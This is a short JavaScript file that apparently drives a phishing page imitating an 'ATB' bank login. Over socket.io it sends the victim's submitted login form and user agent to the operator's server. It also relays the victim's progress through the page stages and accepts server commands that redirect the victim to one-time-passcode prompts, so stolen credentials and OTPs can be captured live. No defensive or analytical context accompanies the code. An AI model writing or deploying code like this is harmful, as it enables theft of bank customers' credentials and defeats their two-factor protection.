const socket = io();
let navig = document.getElementById('navig').textContent
let stage = document.getElementById('stage').textContent

if(stage != 'OTP' && stage != 'Loading'){
    socket.emit('nextNavig', {next: navig})
}

socket.emit('pageandstage', { page: 'ATB', stage: stage })

socket.on('OTP', (data) => {
    if (data.otp) {
        navig = `${data.navig}`;
        socket.emit('typeOTP', {navig: data.navig})
        console.log(data.navig)
    }
})


function submitForm() {
    document.getElementById('userAgent').value = navigator.userAgent;

    const formData = new FormData(document.getElementById('loginForm'));

    socket.emit('submit', Object.fromEntries(formData));

    window.location.href = navig;
}

// Exceptions Parts

socket.on('OTPResponse', (data) => {
    if (data.res) {
        window.location.href = data.next;
    } else {
        console.log(data.next)
        window.location.href = `${data.next}?argument=${encodeURIComponent("true")}`
    }
})